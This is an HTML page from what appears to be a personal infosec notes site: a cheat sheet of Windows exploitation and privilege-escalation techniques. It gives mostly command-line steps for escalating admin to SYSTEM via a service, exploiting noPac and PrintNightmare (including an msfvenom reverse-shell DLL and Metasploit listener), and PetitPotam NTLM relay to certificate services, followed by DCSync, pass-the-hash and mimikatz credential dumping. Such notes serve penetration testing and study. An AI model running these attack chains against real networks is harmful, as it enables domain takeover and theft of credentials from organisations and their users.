<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>ovelny - chaos/windows-exploitation/common-exploits-and-privescs</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta
      name="description"
      content="ovelny - notes on infosec, penetration testing, programming and others"
    />
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="stylesheet" type=text/css href="/assets/css/dead-simple.min.css">
    <link rel="stylesheet" type=text/css href="/assets/css/rouge.min.css">
    <link
      href="/atom.xml"
      rel="alternate"
      title="ovelny"
      type="application/atom+xml"
    />
    <script src="/assets/js/scramble-text.min.js" defer></script>
    <script src="/assets/js/zoom-images.min.js" defer></script>
    <meta name="twitter:card" content="summary"/>
    <meta name="twitter:site" content="@ovelny"/>
    <meta name="twitter:title" content="ovelny - chaos/windows-exploitation/common-exploits-and-privescs"/>
    <meta name="twitter:image" content="https://ovelny.sh/assets/images/ovelny-logo.png"/>
    <meta name="twitter:image:alt" content="ovelny logo: 6 white circles grouped together forming a triangle shape, with a black background."/>
  </head>
  <body>

    <header>
      <section>
        <a href="/">
          <img
            class="logo"
            src="/assets/images/ovelny-pfp.png"
            alt="ovelny profile picture: a glitched picture of a three-eyed girl, staring intensely at the viewer."
          />
        </a>
        <h2><a class="ovelny" href="/">ovelny</a></h2>
      </section>
      <nav>
        <a href="/now/">now</a>
        <a href="/chaos/">chaos</a>
        <a href="/phasm/">phasm</a>
        <a href="/support/">support</a>
        <a href="/atom.xml" target="_blank" rel="noopener noreferrer">rss</a>
        <a href="/about/">about</a>
      </nav>
    </header>
    <main>

    
    <h1>common exploits and privescs</h1>

<p>a place to quickly find ways to exploit and / or perform privilege escalation on windows machines.</p>

<h2>privesc from admin to SYSTEM</h2>

<p>if you are already a local administrator, the easiest way to get a shell as <code>nt authority\system</code> is to create a service from an elevated prompt and run it:</p>

<ul>
<li>open an elevated prompt (<code>Win + X</code> is perfect for this)</li>
<li>upload a payload on your target, with the method of your choice</li>
<li>create a service that will run your payload: <code>sc create payload binpath= &quot;C:\&lt;your-path&gt;\&lt;payload-name&gt;&quot; type= own type= interact</code></li>
<li>run a listener on your attack box</li>
<li>start the service: <code>sc start payload</code></li>
<li>you should now be <code>nt authority\system</code> on your newly acquired shell</li>
</ul>

<h2>noPac vulnerability</h2>

<p>this vulnerability leverages two CVEs, 2021-42278 and 2021-42287. the former allows us to bypass the security account manager (SAM), while the latter is a vulnerability in kerberos privilege attribute certificate (PAC).</p>

<p>noPac is all about samaccountname spoofing. by default, any authenticated domain user can add up to ten computers to the domain.</p>

<p>the idea is to add a computer with a random name, rename it to one of the domain controllers&#39; name (without the trailing <code>$</code>), and request a TGT ticket for the added computer. once obtained, rename the computer back to its original name and request a TGS ticket with the obtained TGT ticket.</p>

<p>because the samaccountname can no longer be found, the TGS will match the closest name, which is the DC, and append a <code>$</code> to it. this will grant us access to the service as domain admin.</p>

<p>in practice, here are automated ways to leverage this vulnerability:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># with https://github.com/Ridter/noPac</span>
<span class="c"># scan target and see if it's vulnerable.</span>
<span class="c"># pay attention to ms-DS-MachineAccountQuota in output</span>
<span class="c"># to make sure we can at least add one computer:</span>
nopac-scanner &lt;DC name with domain&gt;/&lt;username&gt;:&lt;password&gt; <span class="nt">-dc-ip</span> &lt;DC IP&gt; <span class="nt">-use-ldap</span>

<span class="c"># if vulnerable, get a shell with SYSTEM privileges.</span>
<span class="c"># this is noisy and could be blocked by AV and/or EDR.</span>
<span class="c"># this will also save the TGT on your current directory:</span>
nopac &lt;DC name with domain, all caps&gt;/&lt;username&gt;:&lt;password&gt; <span class="nt">-dc-ip</span> &lt;DC IP&gt; <span class="nt">-dc-host</span> &lt;DC <span class="nb">hostname</span><span class="o">&gt;</span> <span class="nt">-shell</span> <span class="nt">--impersonate</span> administrator <span class="nt">-use-ldap</span>

<span class="c"># perform DCSync with secretsdump.py:</span>
nopac &lt;DC name with domain, all caps&gt;/&lt;username&gt;:&lt;password&gt; <span class="nt">-dc-ip</span> &lt;DC IP&gt;  <span class="nt">-dc-host</span> &lt;DC <span class="nb">hostname</span><span class="o">&gt;</span> <span class="nt">--impersonate</span> administrator <span class="nt">-use-ldap</span> <span class="nt">-dump</span> <span class="nt">-just-dc-user</span> &lt;DC name without domain&gt;/administrator
</code></pre></div>

<h2>printnightmare</h2>

<p>printnightmare also groups two vulnerabilities: CVE-2021-34527 and CVE-2021-1675, which affects the print spooler windows service. it allows for local privilege escalation and remote code execution, and automated ways of using it are widely available:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># grab printnighmare's exploit released by cube0x0:</span>
git clone https://github.com/cube0x0/CVE-2021-1675.git

<span class="c"># check if print system asynchronous and remote protocols</span>
<span class="c"># are exposed on target:</span>
rpcdump.py @&lt;target IP&gt; | egrep <span class="s1">'MS-RPRN|MS-PAR'</span>

<span class="c"># if they are, create a DLL payload with msfvenom:</span>
msfvenom <span class="nt">-p</span> windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;attack box IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;attack box port&gt; <span class="nt">-f</span> dll <span class="o">&gt;</span> &lt;filename&gt;.dll

<span class="c"># host the payload on a SMB share with smbserver.py:</span>
smbserver.py <span class="nt">-smb2support</span> &lt;share name&gt; &lt;DLL payload location&gt;

<span class="c"># in msfconsole, use multi handler and set up parameters:</span>
use exploit/multi/handler
<span class="nb">set </span>PAYLOAD windows/x64/meterpreter/reverse_tcp
<span class="nb">set </span>LHOST &lt;attack box IP&gt;
<span class="nb">set </span>LPORT &lt;attack box port&gt;
run

<span class="c"># finally, run exploit against target:</span>
python3 CVE-2021-1675.py &lt;DC name with domain&gt;/&lt;username&gt;:&lt;password&gt;@&lt;target IP&gt; <span class="s1">'\\&lt;target IP&gt;\&lt;share name&gt;\&lt;DLL payload location&gt;'</span>

<span class="c"># you should get a meterpreter session back on msfconsole.</span>
</code></pre></div>

<h2>petitpotam (MS-EFSRPC)</h2>

<p>petitpotam is a vulnerability patched in august 2021. a few reminders are needed to understand how it works:</p>

<ul>
<li>any machine on active directory have a machine account, even when there is no user account present.</li>
<li>by being a MITM during a NTLM authentication, we can catch the NTLM challenge response of a user and impersonate them, effectively authenticating us in their place.</li>
<li>NetNTLMv1 is particularly vulnerable to pass-the-hash attacks.</li>
</ul>

<p>by using EFSRPC (remote procedure calls to manage encrypted file systems), we can leverage a flaw in the protocol that allows us to open files that are located in a completely different location. to do this, EFSRPC uses SMB to fetch said file. which in turn, issues a NTLM challenge to authenticate to SMB.</p>

<p>so by spawning a SMB server and asking anyone to access a file located on our own machine at <code>\\attacker\&lt;path&gt;</code>, we can make that user (or machine) authenticate to our SMB server and catch their NTLM hash in the process. we can then leverage that hash with a pass-the-hash attack or crack it.</p>

<p>this is not the only thing we can do with this vuln, however: if the ADCS (active directory certificate services) is in use on the domain, we can relay the authentication request of the domain controller to the certificate authority, make a new certificate for us, which in turn allows us to request a TGT for the domain controller and compromise the entire domain with a DCSync attack.</p>

<p>petitpotam is not a full exploit chain, but it&#39;s a stepping stone for one. by catching NTLM hashes or getting a domain controller&#39;s TGT, things can get real bad real quick.</p>

<p>here&#39;s an example to exploit a vulnerable target with the <code>EfsRpcOpenFileRaw</code> method:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># if the location of the certificate authority</span>
<span class="c"># is unknown, use certipy-ad to find it:</span>
certipy-ad find <span class="nt">-u</span> &lt;username&gt;@&lt;DC name with domain&gt; <span class="nt">-p</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">-dc-ip</span> &lt;IP address&gt; <span class="nt">-stdout</span>

<span class="c"># start a NTLM relay on our attack box, with</span>
<span class="c"># the web enrollment URL for the certificate</span>
<span class="c"># authority:</span>
ntlmrelayx.py <span class="nt">-debug</span> <span class="nt">-smb2support</span> <span class="nt">--target</span> http://&lt;machine name&gt;.&lt;DC name with domain&gt;/certsrv/certfnsh.asp <span class="nt">--adcs</span> <span class="nt">--template</span> &lt;DomainController or KerberosAuthentication&gt;

<span class="c"># run petitpotam to coerce the domain controller</span>
<span class="c"># to connect to our attack box:</span>
petitpotam &lt;attack box IP&gt; &lt;domain controller IP&gt;

<span class="c"># base64-encoded certificate for the domain</span>
<span class="c"># controller should now appear with ntlmrelayx.py.</span>
<span class="c"># we can request a TGT for the domain controller</span>
<span class="c"># with it, using gettgtpkinit:</span>
gettgtpkinit &lt;DC name with domain&gt;/&lt;machine name&gt;<span class="se">\$</span> <span class="nt">-pfx-base64</span> &lt;base64-encoded certificate&gt; &lt;ccache filename <span class="k">for </span>TGT&gt;

<span class="c"># set up KRB5CCNAME env variable with our</span>
<span class="c"># ccache file, so our attack box uses it</span>
<span class="c"># for kerberos authentication:</span>
<span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>&lt;ccache filename <span class="k">for </span>TGT&gt;

<span class="c"># perform a DCSync attack to retrieve NTLM</span>
<span class="c"># password hashes:</span>
secretsdump.py <span class="nt">-just-dc-user</span> &lt;DC name without domain&gt;/&lt;username&gt; <span class="nt">-k</span> <span class="nt">-no-pass</span> <span class="s2">"&lt;machine name with dollar sign&gt;"</span>@&lt;machine name&gt;.&lt;DC name with domain&gt;

<span class="c"># use NT hash of built-in admin account to</span>
<span class="c"># authenticate to domain controller:</span>
nxc smb &lt;DC IP&gt; <span class="nt">-u</span> administrator <span class="nt">-H</span> &lt;<span class="nb">hash</span><span class="o">&gt;</span>

<span class="c"># alternatively, once the TGT has been obtained,</span>
<span class="c"># submit a TGS request with the privilege attribute</span>
<span class="c"># certificate, which contains the NT hash of the target:</span>
getnthash <span class="nt">-key</span> &lt;AS REP key from gettgtpkinit&gt; &lt;DC name with domain&gt;/&lt;machine name with dollar sign&gt;

<span class="c"># then perform a DCSync attack too, with obtained</span>
<span class="c"># hash:</span>
secretsdump.py <span class="nt">-just-dc-user</span> &lt;DC name without domain&gt;/&lt;username&gt; <span class="s2">"&lt;machine name with dollar sign&gt;"</span>@&lt;machine IP&gt; <span class="nt">-hashes</span> &lt;NT <span class="nb">hash</span><span class="o">&gt;</span>
</code></pre></div>

<p>what we&#39;re doing here can also be achieved with rubeus on a windows host, once we obtain the base64-encoded certificate with <code>ntlmrelayx.py</code>:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># request TGT ticket and perform PTT</span><span class="w">
</span><span class="c"># (pass the ticket) attack with rubeus:</span><span class="w">
</span><span class="o">.</span><span class="n">\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">machine</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">dollar</span><span class="w"> </span><span class="nx">sign</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/certificate:</span><span class="err">&lt;</span><span class="nx">base64</span><span class="w"> </span><span class="nx">encoded</span><span class="w"> </span><span class="nx">certificate</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">

</span><span class="c"># confirm that ticket is now in memory:</span><span class="w">
</span><span class="n">klist</span><span class="w">

</span><span class="c"># perform DCSync with mimikatz to</span><span class="w">
</span><span class="c"># get a specific user's hash:</span><span class="w">
</span><span class="o">.</span><span class="n">\mimikatz.exe</span><span class="w">
</span><span class="c"># in mimikatz prompt:</span><span class="w">
</span><span class="n">lsadump::dcsync</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">DC</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="nx">without</span><span class="w"> </span><span class="nx">domain</span><span class="err">&gt;</span><span class="nx">\</span><span class="err">&lt;</span><span class="nx">SAM</span><span class="w"> </span><span class="nx">username</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<h2>references</h2>

<ul>
<li><a href="https://blog.geoda-security.com/2017/06/elevate-from-admin-to-nt-authoritysystem.html" rel="nofollow">https://blog.geoda-security.com/2017/06/elevate-from-admin-to-nt-authoritysystem.html</a></li>
<li><a href="https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware" rel="nofollow">https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware</a></li>
<li><a href="https://peertube.rural-it.org/w/2CpBo5RcChpZx8spUTT6sa" rel="nofollow">https://peertube.rural-it.org/w/2CpBo5RcChpZx8spUTT6sa</a></li>
<li><a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf" rel="nofollow">https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf</a></li>
</ul>

    
    </main>
    <footer id="footer">
      <div class="footer-section"><a href="/license/">CC BY-NC-SA 4.0</a><p>&nbsp;::&nbsp;2019 - 2025 ovelny</p></div>
      <div class="footer-section">「七転び八起き」</div>
    </footer>
  </body>
</html>

